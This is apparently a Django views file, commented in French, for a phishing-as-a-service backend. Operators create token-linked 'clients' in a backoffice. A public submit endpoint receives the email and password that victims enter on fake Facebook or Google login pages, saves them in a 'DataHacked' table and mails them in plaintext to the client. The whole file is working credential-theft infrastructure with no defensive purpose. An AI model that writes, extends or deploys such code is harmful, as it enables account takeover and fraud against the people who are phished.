from django.conf import settings
from django.core.mail import send_mail
from django.utils.timezone import now
from rest_framework import status
from rest_framework.permissions import AllowAny, IsAuthenticated
from rest_framework.response import Response
from rest_framework.views import APIView

from core.models import ClientHack, DataHacked
from core.serializers import ClientHackSerializer, DataHackedSerializer, SubmitHackSerializer


# ─────────────────────────────────────────────
# BACKOFFICE — nécessite JWT
# ─────────────────────────────────────────────

class ClientHackView(APIView):
    """
    GET  /hack/clients/          → liste tous les clients
    POST /hack/clients/          → créer un client (token généré auto)
    """
    permission_classes = [IsAuthenticated]

    def get(self, request):
        clients = ClientHack.objects.all()
        serializer = ClientHackSerializer(clients, many=True)
        return Response(serializer.data)

    def post(self, request):
        serializer = ClientHackSerializer(data=request.data)
        if serializer.is_valid():
            serializer.save()
            return Response(serializer.data, status=status.HTTP_201_CREATED)
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)


class ClientHackDetailView(APIView):
    """
    GET    /hack/clients/<id>/   → détail + toutes les soumissions du client
    DELETE /hack/clients/<id>/   → supprimer le client
    """
    permission_classes = [IsAuthenticated]

    def get(self, request, pk):
        try:
            client = ClientHack.objects.get(pk=pk)
        except ClientHack.DoesNotExist:
            return Response({"error": "Client introuvable."}, status=status.HTTP_404_NOT_FOUND)

        client_data    = ClientHackSerializer(client).data
        submissions    = DataHacked.objects.filter(client=client)
        sub_data       = DataHackedSerializer(submissions, many=True).data
        client_data["submissions"] = sub_data
        return Response(client_data)

    def delete(self, request, pk):
        try:
            client = ClientHack.objects.get(pk=pk)
        except ClientHack.DoesNotExist:
            return Response({"error": "Client introuvable."}, status=status.HTTP_404_NOT_FOUND)
        client.delete()
        return Response({"message": "Client supprimé."}, status=status.HTTP_204_NO_CONTENT)


class DataHackedListView(APIView):
    """
    GET /hack/data/              → liste toutes les soumissions (toutes victimes)
    GET /hack/data/?client=<id>  → filtrer par client
    GET /hack/data/?type=facebook|google → filtrer par type
    """
    permission_classes = [IsAuthenticated]

    def get(self, request):
        qs = DataHacked.objects.all()
        client_id = request.query_params.get("client")
        hack_type = request.query_params.get("type")
        if client_id:
            qs = qs.filter(client__id=client_id)
        if hack_type:
            qs = qs.filter(type=hack_type)
        serializer = DataHackedSerializer(qs, many=True)
        return Response(serializer.data)


class DataHackedDetailView(APIView):
    """
    DELETE /hack/data/<id>/      → supprimer une soumission
    """
    permission_classes = [IsAuthenticated]

    def delete(self, request, pk):
        try:
            entry = DataHacked.objects.get(pk=pk)
        except DataHacked.DoesNotExist:
            return Response({"error": "Entrée introuvable."}, status=status.HTTP_404_NOT_FOUND)
        entry.delete()
        return Response({"message": "Supprimé."}, status=status.HTTP_204_NO_CONTENT)


# ─────────────────────────────────────────────
# FRONT PUBLIC (facebook / google)
# ─────────────────────────────────────────────

class HackSubmitView(APIView):
    """
    POST /hack/<token>/submit/
    Body: { "email": "...", "password": "...", "type": "facebook"|"google" }

    1. Vérifie que le token existe
    2. Enregistre dans DataHacked
    3. Envoie un mail au client avec email, password, date, heure
    """
    permission_classes = [AllowAny]

    def post(self, request, token):
        # 1. Retrouver le client
        try:
            client = ClientHack.objects.get(token=token)
        except ClientHack.DoesNotExist:
            return Response({"error": "Lien invalide."}, status=status.HTTP_404_NOT_FOUND)

        # 2. Valider les données
        serializer = SubmitHackSerializer(data=request.data)
        if not serializer.is_valid():
            return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)

        email    = serializer.validated_data["email"]
        password = serializer.validated_data["password"]
        hack_type = serializer.validated_data["type"]
        dt = now()

        # 3. Enregistrer en BDD
        DataHacked.objects.create(
            client=client,
            email=email,
            password=password,
            type=hack_type,
        )

        # 4. Envoyer mail au client
        message = (
            f"Nouvelle soumission [{hack_type.upper()}]\n\n"
            f"Email    : {email}\n"
            f"Password : {password}\n"
            f"Date     : {dt.strftime('%Y-%m-%d')}\n"
            f"Heure    : {dt.strftime('%H:%M:%S')}\n"
        )
        try:
            send_mail(
                subject=f"[{hack_type.upper()}] Nouvelle soumission",
                message=message,
                from_email=settings.EMAIL_HOST_USER,
                recipient_list=[client.email],
                fail_silently=False,
            )
        except Exception as e:
            # Enregistré mais mail échoué — on ne bloque pas
            return Response(
                {"warning": f"Enregistré, mail non envoyé : {str(e)}"},
                status=status.HTTP_201_CREATED,
            )

        return Response({"message": "ok"}, status=status.HTTP_201_CREATED)
